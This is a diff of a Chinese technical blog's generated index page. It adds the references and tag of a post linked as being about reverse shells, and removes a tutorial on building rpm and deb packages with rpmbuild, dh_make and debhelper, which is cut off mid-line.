+<h3 id="0x04-引用文献"><a href="#0x04-引用文献" class="headerlink" title="0x04 引用文献"></a><em>0x04 引用文献</em></h3><p>[1]<a target="_blank" rel="noopener" href="https://blog.csdn.net/mountzf/article/details/51735691">https://blog.csdn.net/mountzf/article/details/51735691</a><br>[2]<a target="_blank" rel="noopener" href="https://www.cnblogs.com/LittleHann/p/12038070.html">https://www.cnblogs.com/LittleHann/p/12038070.html</a><br>[3]<a target="_blank" rel="noopener" href="https://blog.csdn.net/worldchinalee/article/details/104049141">https://blog.csdn.net/worldchinalee/article/details/104049141</a></p>
+</div></div></div></div></div></div></div></div></div></div>
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">信息安全技术</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/09/18/%E5%8F%8D%E5%BC%B9Shell/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-Linux驱动内核模块" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -372,294 +517,6 @@
 
 
   
-    <article id="post-deb与rpm打包" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/06/24/deb%E4%B8%8Erpm%E6%89%93%E5%8C%85/">deb与rpm打包</a>
-    </h1>
-  
-
-        
-        <a href="/2021/06/24/deb%E4%B8%8Erpm%E6%89%93%E5%8C%85/" class="archive-article-date">
-  	<time datetime="2021-06-24T02:17:29.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-06-24</time>
-</a>
-        
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="0x00-引言"><a href="#0x00-引言" class="headerlink" title="0x00 引言"></a><em>0x00 引言</em></h3><p>&emsp;&emsp; Debian下的安装包后缀名.deb，Unix服务器的安装包后缀名一般为.rpm 。本文主要研究如何打这两种包。</p>
-<h3 id="0x01-rpm打包"><a href="#0x01-rpm打包" class="headerlink" title="0x01 rpm打包"></a><em>0x01 rpm打包</em></h3><p>&emsp;&emsp;rpm打包默认是以源码打包的形式，当然也可以利用这种机制实现非源码打包。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1 环境搭建</span><br><span class="line">2 基础知识构建</span><br><span class="line">  2.1 rpm打包文件结构</span><br><span class="line">  2.2 rpm目录路径宏</span><br><span class="line">  2.3 rpm常用路径宏</span><br><span class="line">  2.4 SPEC文件执行流程</span><br><span class="line">3 源码打包方法</span><br><span class="line">4 非源码打包方法</span><br></pre></td></tr></table></figure>
-
-<p><strong><em>1、环境搭建</em></strong><br>&emsp;&emsp; 这里以centos7为rpm打包平台，具体的环境配置已经在仓库里面，可以自行<a target="_blank" rel="noopener" href="https://github.com/JailbreakFox/Linux-sh-package/blob/master/Centos/Centos%20Mini.md">查阅资料</a><sup>[1]</sup>。  </p>
-<p><strong><em>2、基础知识构建</em></strong><br><strong><em>2.1、rpm打包文件结构</em></strong><br>&emsp;&emsp; rpmdev-setuptree命令由工具rpmdevtools提供，可以直接在/root/rpmbuild/目录下生成rpm打包所需的目录结构。下面具体描述各个文件夹的作用:  </p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ tree /root/rpmbuild</span><br><span class="line">rpmbuild</span><br><span class="line">├── SOURCES    <span class="comment"># 源码路径</span></span><br><span class="line">├── BUILD      <span class="comment"># 源码编译路径</span></span><br><span class="line">├── SPECS      <span class="comment"># rpm生成规则存放路径</span></span><br><span class="line">├── RPMS       <span class="comment"># rpm包生成路径</span></span><br><span class="line">└── SRPMS      <span class="comment"># rpm源码包生成路径</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>SOURCES - 如果是用源码打包，则只需要将源码的tar.gz文件存放于此即可;</li>
-<li>BUILD - rpmbuild工具会自行将SOURCES目录中的源码在此处解压，该文件无需手动修改，具体编译方法需要在SPECS下的.spec文件中描述;</li>
-<li>SPECS - 需要人工操作的只有该文件夹，里面可以存放各种rpm打包规则的.spec文件，后面详细介绍;</li>
-<li>RPMS - 当打包完成，会在此处生成release与debug版的.rpm包;</li>
-<li>SRPMS - 当打包完成，会在此处生成源码.rpm包;</li>
-<li>*BUILDROOT - 该目录是在SPECS打包过程中自动生成的，其重要性是最后打完的包需要安装的文件及其路径都以该目录为模板。  </li>
-</ul>
-<p><strong><em>2.2、rpm目录路径宏</em></strong><br>&emsp;&emsp; 各路径宏参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/get_set/article/details/53453320">文献</a><sup>[2]</sup>  </p>
-<table>
-<thead>
-<tr>
-<th>目录</th>
-<th>宏代码</th>
-<th>用途</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>/root/rpmbuild/SOURCES</td>
-<td>%_sourcedir</td>
-<td>保存源码包（如 .tar 包）和所有 patch 补丁</td>
-</tr>
-<tr>
-<td>/root/rpmbuild/BUILD</td>
-<td>%_builddir</td>
-<td>源码包被解压至此，并在该目录的子目录完成编译</td>
-</tr>
-<tr>
-<td>/root/rpmbuild/BUILDROOT</td>
-<td>%_buildrootdir</td>
-<td>保存 %install 阶段安装的文件</td>
-</tr>
-<tr>
-<td>/root/rpmbuild/SPECS</td>
-<td>%_specdir</td>
-<td>保存 RPM 包配置（.spec）文件</td>
-</tr>
-<tr>
-<td>/root/rpmbuild/RPMS</td>
-<td>%_rpmdir</td>
-<td>生成/保存二进制 RPM 包</td>
-</tr>
-<tr>
-<td>/root/rpmbuild/SRPMS</td>
-<td>%_srcrpmdir</td>
-<td>生成/保存源码 RPM 包(SRPM)</td>
-</tr>
-</tbody></table>
-<p><strong><em>2.3、rpm常用路径宏</em></strong><br>&emsp;&emsp; 各路径宏参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/get_set/article/details/53453320">文献</a><sup>[2]</sup>  </p>
-<table>
-<thead>
-<tr>
-<th>路径</th>
-<th>宏</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>/etc</td>
-<td>%{_sysconfdir}</td>
-</tr>
-<tr>
-<td>/usr</td>
-<td>%{_prefix}</td>
-</tr>
-<tr>
-<td>%{_prefix}</td>
-<td>%{_exec_prefix}</td>
-</tr>
-<tr>
-<td>%{_exec_prefix}/bin</td>
-<td>%{_bindir}</td>
-</tr>
-<tr>
-<td>%{_exec_prefix}/%{_lib}</td>
-<td>%{_libdir}</td>
-</tr>
-<tr>
-<td>%{_exec_prefix}/libexec</td>
-<td>%{_libexecdir}</td>
-</tr>
-<tr>
-<td>%{_exec_prefix}/sbin</td>
-<td>%{_sbindir}</td>
-</tr>
-<tr>
-<td>/var/lib</td>
-<td>%{_sharedstatedir}</td>
-</tr>
-<tr>
-<td>%{_prefix}/share</td>
-<td>%{_datarootdir}</td>
-</tr>
-<tr>
-<td>%{_datarootdir}</td>
-<td>%{_datadir}</td>
-</tr>
-<tr>
-<td>%{_prefix}/include</td>
-<td>%{_includedir}</td>
-</tr>
-<tr>
-<td>/usr/share/info</td>
-<td>%{_infodir}</td>
-</tr>
-<tr>
-<td>/usr/share/man</td>
-<td>%{_mandir}</td>
-</tr>
-<tr>
-<td>/var</td>
-<td>%{_localstatedir}</td>
-</tr>
-<tr>
-<td>%{_sysconfdir}/rc.d/init.d</td>
-<td>%{_initddir}</td>
-</tr>
-<tr>
-<td>/var</td>
-<td>%{_var}</td>
-</tr>
-<tr>
-<td>%{_var}/tmp</td>
-<td>%{_tmppath}</td>
-</tr>
-<tr>
-<td>/usr</td>
-<td>%{_usr}</td>
-</tr>
-<tr>
-<td>%{_usr}/src</td>
-<td>%{_usrsrc}</td>
-</tr>
-<tr>
-<td>lib (lib64 on 64bit multilib systems)</td>
-<td>%{_lib}</td>
-</tr>
-<tr>
-<td>%{_datadir}/doc</td>
-<td>%{_docdir}</td>
-</tr>
-<tr>
-<td>%{_buildrootdir}/%{name}-%{version}-%{release}.%{_arch}</td>
-<td>%{buildroot}</td>
-</tr>
-<tr>
-<td>%{buildroot}</td>
-<td>$RPM_BUILD_ROOT</td>
-</tr>
-</tbody></table>
-<p><strong><em>2.4、SPEC文件执行流程</em></strong>  </p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 升级时完整执行流程：</span></span><br><span class="line">1、执行新包spec文件中 %pre 段.</span><br><span class="line">2、安装新包的相关依赖包.</span><br><span class="line">3、执行新包spec文件中的 %post 段.</span><br><span class="line">4、执行旧包spec文件中的 %preun 段.</span><br><span class="line">5、删除新包中不需要的旧文件。</span><br><span class="line">6、执行旧包spec文件中的 %postun 段.</span><br><span class="line"></span><br><span class="line"><span class="comment"># 完整参数传递：</span></span><br><span class="line">%pre和%post段</span><br><span class="line">当传递的第一个参数为1时，表示新安装一个rpm包。</span><br><span class="line">当传递的第一个参数为2时，表示升级一个已经存在的包。</span><br><span class="line">%preun和%postun段</span><br><span class="line">当传递的第一个参数为0时，表示删除一个包。</span><br><span class="line">当传递的第一个参数为1时，表示更新一个包。</span><br></pre></td></tr></table></figure>
-
-<p><strong><em>3、源码打包方法</em></strong><br>&emsp;&emsp; SPECS撰写方法参考<a target="_blank" rel="noopener" href="https://www.cnblogs.com/SQL888/p/5776442.html">文献</a><sup>[3]</sup>，这里以最后实现的一个rpm项目打包为例。首先要在/root/rpmbuild/SPECS/目录下新建一个.spec文件，并且内部需要实现一些字段，下面解释各个部分的作用:</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 项目名</span></span><br><span class="line">name: CTest</span><br><span class="line"><span class="comment"># 项目版本</span></span><br><span class="line">Version: 1.0</span><br><span class="line"><span class="comment"># 发布序列号</span></span><br><span class="line">Release: 1%&#123;?dist&#125;</span><br><span class="line"><span class="comment"># 概要</span></span><br><span class="line">Summary: The <span class="string">&quot;CTest&quot;</span> program from GNU</span><br><span class="line">Summary(zh_CN):  GNU <span class="string">&quot;Hello World&quot;</span> 程序</span><br><span class="line"><span class="comment"># 开源协议</span></span><br><span class="line">License: GPLv3+</span><br><span class="line"><span class="comment"># 源代码路径，即放在SOURCES目录下的tar包名</span></span><br><span class="line">Source0: %&#123;name&#125;.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="comment"># 简介</span></span><br><span class="line">%description</span><br><span class="line">The <span class="string">&quot;CTest&quot;</span> program</span><br><span class="line"></span><br><span class="line"><span class="comment"># 简介中文</span></span><br><span class="line">%description -l zh_CN</span><br><span class="line"><span class="string">&quot;CTest&quot;</span> 程序</span><br><span class="line"></span><br><span class="line"><span class="comment"># rpm进行实际打包准备工作的阶段</span></span><br><span class="line">%prep</span><br><span class="line"></span><br><span class="line"><span class="comment"># rpm安装前执行的脚本</span></span><br><span class="line">%prep</span><br><span class="line"><span class="comment"># 作用: 将解压后的源码重命名为/root/rpmbuild/BUILD/CTest/</span></span><br><span class="line">%setup -n CTest</span><br><span class="line"></span><br><span class="line"><span class="comment"># rpm安装后执行的脚本</span></span><br><span class="line">%post</span><br><span class="line"></span><br><span class="line"><span class="comment"># rpm卸载前执行的脚本</span></span><br><span class="line">%preun</span><br><span class="line"></span><br><span class="line"><span class="comment"># rpm卸载后执行的脚本</span></span><br><span class="line">%postun</span><br><span class="line"></span><br><span class="line"><span class="comment"># build默认 cd /root/rpmbuild/BUILD/CTest/ 目录下</span></span><br><span class="line">%build</span><br><span class="line">mkdir build</span><br><span class="line"><span class="built_in">cd</span> build</span><br><span class="line">cmake ..</span><br><span class="line">make %&#123;?_smp_mflags&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># install默认 cd /root/rpmbuild/BUILD/CTest/ 目录下</span></span><br><span class="line"><span class="comment"># 开始把软件安装到虚拟的根目录中，正规写法应该是在MakeFile里面些install</span></span><br><span class="line"><span class="comment"># 虚拟根目录即 /root/rpmbuild/BUILDROOT/’包名‘</span></span><br><span class="line"><span class="comment"># 可以用宏 $RPM_BUILD_ROOT 或 %&#123;buildroot&#125; 代替</span></span><br><span class="line">%install</span><br><span class="line">mkdir -p %&#123;buildroot&#125;%&#123;_bindir&#125;</span><br><span class="line"><span class="built_in">cd</span> build</span><br><span class="line">cp CTest %&#123;buildroot&#125;%&#123;_bindir&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># files能指定最终打包到安装包的文件</span></span><br><span class="line"><span class="comment"># !!files默认 cd /root/rpmbuild/BUILDROOT/&#x27;包名&#x27;/ 目录下</span></span><br><span class="line"><span class="comment"># %defattr(文件权限,用户名,组名,目录权限),其中&#x27;-&#x27;表示默认权限</span></span><br><span class="line">%files</span><br><span class="line">%defattr(-,root,root,-)</span><br><span class="line">%&#123;_bindir&#125;/*</span><br><span class="line"></span><br><span class="line"><span class="comment"># 变更日志</span></span><br><span class="line">%changelog</span><br><span class="line">* Sun MAY 4 2021 Your Name &lt;youremail@xxx.xxx&gt; - 1.0</span><br><span class="line">- Update to 1.0</span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;最后只需要执行生成rpm包的指令:</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpmbuild -ba <span class="string">&#x27;.spec文件路径&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p><strong><em>4、非源码打包方法</em></strong><br>&emsp;&emsp; 如果无源码，只有一些已经编译完成的链接库与可执行文件，则可以借用打包机制，跳过编译步骤，直接将需要打入rpm包的文件拷贝到/root/rpmbuild/BUILDROOT/目录下:</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="comment"># rpm进行实际打包准备工作的阶段</span></span><br><span class="line">%prep</span><br><span class="line">mkdir -p %&#123;buildroot&#125;/<span class="string">&#x27;文件安装的路径&#x27;</span></span><br><span class="line">cp -r <span class="string">&#x27;要存放的文件夹&#x27;</span> %&#123;buildroot&#125;/<span class="string">&#x27;文件安装的路径&#x27;</span></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="comment"># files能指定最终打包到安装包的文件</span></span><br><span class="line">%files</span><br><span class="line">%defattr(-,root,root,-)</span><br><span class="line">%<span class="string">&#x27;需要打包的路径&#x27;</span></span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;最后只需要执行生成rpm包的指令:</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpmbuild -ba <span class="string">&#x27;.spec文件路径&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="0x02-deb打包"><a href="#0x02-deb打包" class="headerlink" title="0x02 deb打包"></a><em>0x02 deb打包</em></h3><p>&emsp;&emsp;虽然deb打包的网上资料较少，但是实际上也是能实现源码与非源码打包的，并且天然支持CMake。可以参考下<a target="_blank" rel="noopener" href="https://www.debian.org/doc/manuals/maint-guide/index.zh-cn.html">debian维护手册</a><sup>[4]</sup>。<br>&emsp;&emsp;打包方法总共有三种:  </p>
-<ul>
-<li>debuild - 这种方法较复杂但是做的事情最多。该方法会创建上传Debian软件包所需的所有文件。它首先运行 dpkg-buildpackage，然后在创建的 .changes 文件上运行 lintian（假设安装了 lintian，这是一个 Debian 上面的包质量的检测工具），最后根据需要对 .changes 和/或 .dsc 文件进行签名。  </li>
-<li>dpkg-buildpackage - debuild方法的第一步，如果不做签名等复杂操作，这个方法足矣</li>
-<li>dpkg-deb - 这种方法是为了快速打包，并且只能非源码打包，但并不是常用的方法，相比之下，还是使用dpkg-buildpackage更好<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1 环境搭建</span><br><span class="line">2 基础知识构建</span><br><span class="line">  2.1 deb打包文件结构</span><br><span class="line">  2.2 debian&#x2F;control文件详解</span><br><span class="line">  2.3 debian&#x2F;rules文件粗解</span><br><span class="line">  2.4 debian&#x2F;install + debian&#x2F;postinst的使用</span><br><span class="line">  2.5 deb打包钩子脚本执行流程</span><br><span class="line">3 源码打包方法</span><br><span class="line">  3.1 debuild &#x2F; dpkg-buildpackage</span><br><span class="line">4 非源码打包方法</span><br><span class="line">  4.1 debuild &#x2F; dpkg-buildpackage</span><br><span class="line">  4.2 dpkg-deb</span><br></pre></td></tr></table></figure></li>
-</ul>
-<p><strong><em>1、环境搭建</em></strong>  </p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># debuild环境</span></span><br><span class="line">sudo apt install dh-make devscripts cmake gcc</span><br><span class="line"></span><br><span class="line"><span class="comment"># dpkg-buildpackage环境</span></span><br><span class="line">sudo apt install dh-make cmake gcc</span><br><span class="line"></span><br><span class="line"><span class="comment"># dpkg-deb环境</span></span><br><span class="line">sudo apt install fakeroot cmake gcc</span><br></pre></td></tr></table></figure>
-
-<p><strong><em>2、基础知识构建</em></strong><br><strong><em>2.1、deb打包文件结构</em></strong><br>&emsp;&emsp; 在已有tar.gz包的情况下(无论里面放源码还是编译生成后文件，自动生成debian目录只需要得到tar包名字)，可以使用dh_make工具自动生成debian目录(具体方法在下面几节)。下面具体描述debian文件夹各文件的作用:  </p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># deb源码打包示例项目的最终结构如下</span></span><br><span class="line">debbuild/</span><br><span class="line">├── ctest-1.0</span><br><span class="line">│   ├── CMakeLists.txt</span><br><span class="line">│   ├── CTest.cpp</span><br><span class="line">│   └── debian</span><br><span class="line">│       ├── changelog</span><br><span class="line">│       ├── compat</span><br><span class="line">│       ├── control</span><br><span class="line">│       ├── rules</span><br><span class="line">│       └── <span class="built_in">source</span></span><br><span class="line">│           └── format</span><br><span class="line">└── ctest-1.0.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="comment"># debian目录是自动生成的，初始生成结构如下</span></span><br><span class="line"><span class="comment"># 需要注意dpkg-buildpackage指令使用小写debian</span></span><br><span class="line"><span class="comment"># dpkg-deb指令使用大写DEBIAN文件夹</span></span><br><span class="line">debian/</span><br><span class="line">├── changelog          <span class="comment"># 包的更新历史，后面可以使用dch -i指令修改</span></span><br><span class="line">├── compat             <span class="comment"># 包的兼容性，与debian policy版本有关</span></span><br><span class="line">├── control            <span class="comment"># 包的描述信息</span></span><br><span class="line">├── copyright          <span class="comment"># 包的版权信息</span></span><br><span class="line">├── ctest.cron.d.ex</span><br><span class="line">├── ctest.default.ex</span><br><span class="line">├── ctest.doc-base.EX</span><br><span class="line">├── ctest-docs.docs</span><br><span class="line">├── init.d.ex</span><br><span class="line">├── manpage.1.ex</span><br><span class="line">├── manpage.sgml.ex</span><br><span class="line">├── manpage.xml.ex</span><br><span class="line">├── menu.ex</span><br><span class="line">├── postinst.ex        <span class="comment"># 安装后执行脚本，使用前去掉.ex后缀</span></span><br><span class="line">├── postrm.ex          <span class="comment"># 卸载后执行脚本，使用前去掉.ex后缀</span></span><br><span class="line">├── preinst.ex         <span class="comment"># 安装前执行脚本，使用前去掉.ex后缀</span></span><br><span class="line">├── prerm.ex           <span class="comment"># 卸载前执行脚本，使用前去掉.ex后缀</span></span><br><span class="line">├── README.Debian</span><br><span class="line">├── README.source</span><br><span class="line">├── rules              <span class="comment"># 包的编译方法</span></span><br><span class="line">├── <span class="built_in">source</span></span><br><span class="line">│   └── format         <span class="comment"># 包的版本</span></span><br><span class="line">└── watch.ex           <span class="comment"># 包的升级链接，使用前去掉.ex后缀</span></span><br></pre></td></tr></table></figure>
-
-<p><strong><em>2.2、debian/control文件详解</em></strong><br>&emsp;&emsp;其他文件均可自行研究，但是control文件是最重要的，与初始状态不一致，已经改过，这边有必要解释一下:</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ cat debbuild/ctest-1.0/debian/control </span><br><span class="line">Source: ctest  <span class="comment"># 这就是根据tar.gz包名自动生成的项目名</span></span><br><span class="line">Section: unknown  <span class="comment"># 该源码包要进入发行版中的分类</span></span><br><span class="line">Priority: optional  <span class="comment"># 描述用户安装该包的重要程度</span></span><br><span class="line">Maintainer: xyh &lt;yhxu94@126.com&gt;  <span class="comment"># 源码维护者的名字和邮箱</span></span><br><span class="line">Build-Depends: debhelper (&gt;=9)  <span class="comment"># 编译依赖</span></span><br><span class="line"> cmake,</span><br><span class="line"> qtbase5-dev</span><br><span class="line">Standards-Version: 3.9.6  <span class="comment"># 此软件包所依据的“Debian Policy Manual”标准版本号</span></span><br><span class="line">Homepage: https://jailbreakfox.github.io/</span><br><span class="line"></span><br><span class="line">Package: ctest  <span class="comment"># 二进制软件包的名称。通常情况下与源代码包相同，但不是必须的</span></span><br><span class="line">Architecture: any  <span class="comment"># 目标机架构，可以是其他架构，比如amd64</span></span><br><span class="line"><span class="comment"># Debian软件包系统最强大的特性之一。每个软件包都可以和其他软件包有各种不同的关系</span></span><br><span class="line">Depends: <span class="variable">$&#123;shlibs:Depends&#125;</span>, <span class="variable">$&#123;misc:Depends&#125;</span>  <span class="comment"># 运行时依赖</span></span><br><span class="line">Recommends: XXXX(&gt;=5.1.0.0)   <span class="comment"># 建议依赖，不影响使用</span></span><br><span class="line">Description:  <span class="comment"># 软件的简短描述</span></span><br></pre></td></tr></table></figure>
-
-<p><strong><em>2.3、debian/rules文件粗解</em></strong><br>&emsp;&emsp;网上都说control是debian目录下的核心文件，但其实还有一个很重要的文件就是rules，但由于目前精力有限，只能大致窥探其作用。在不知道如何使用的情况下，使用初始化的rules文件即可。<br>&emsp;&emsp;rules文件本质上是一个Makefile文件，这个Makefile文件定义了创建deb格式软件包的规则。打包工具按照rules文件指定的规则，完成编译，将软件安装到临时安装目录，清理编译目录等操作，并依据安装到临时目录的文件来生成deb格式的软件包。<br>dh_make 会生成一个使用 dh 命令的非常简单但非常强大的默认的 rules 文件:</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/make -f</span></span><br><span class="line"><span class="comment"># -*- makefile -*-</span></span><br><span class="line"><span class="comment"># Uncomment this to turn on verbose mode.</span></span><br><span class="line"><span class="comment">#export DH_VERBOSE=1  打开后编译输出更详细</span></span><br><span class="line"><span class="comment">#export DH_BUILD_OPTIONS=nocheck  可以跳过编译后的测试，对于某些编译不过的包有效</span></span><br><span class="line"></span><br><span class="line">%:</span><br><span class="line">  dh <span class="variable">$@</span></span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;实际上rules文件的dh语言是由debhelper工具来解析的，不要看上面只有短短一行语句，但实际上它的进化简化过程很漫长:  </p>
-<div align="center">
-<img src="/2021/06/24/deb%E4%B8%8Erpm%E6%89%93%E5%8C%85/debhelper进化.png">
-<div align="left">  
-
-<p>&emsp;&emsp;甚至有些指令会在实际打包的时候用到，从中可以窥见其运行的过程:  </p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 打包结束后，打包目录下是非常乱的</span></span><br><span class="line">$ tree debian</span><br><span class="line">debian/</span><br><span class="line">├── changelog</span><br><span class="line">├── compat</span><br><span class="line">├── control</span><br><span class="line">├── ctest</span><br><span class="line">│   ├── DEBIAN</span><br><span class="line">│   │   ├── control</span><br><span class="line">│   │   └── md5sums</span><br><span class="line">│   └── usr</span><br><span class="line">│       ├── bin</span><br><span class="line">│       │   └── CTest</span><br><span class="line">│       └── share</span><br><span class="line">│           └── doc</span><br><span class="line">│               └── ctest</span><br><span class="line">│                   └── changelog.Debian.gz</span><br><span class="line">├── ctest.debhelper.log</span><br><span class="line">├── ctest.substvars</span><br><span class="line">├── debhelper-build-stamp</span><br><span class="line">├── files</span><br><span class="line">├── rules</span><br><span class="line">└── <span class="built_in">source</span></span><br><span class="line">    └── format</span><br><span class="line"></span><br><span class="line"><span class="comment"># 此时可以在打包目录下执行dh clean，清理打包产生的文件</span></span><br><span class="line"><span class="comment"># 实际上dh 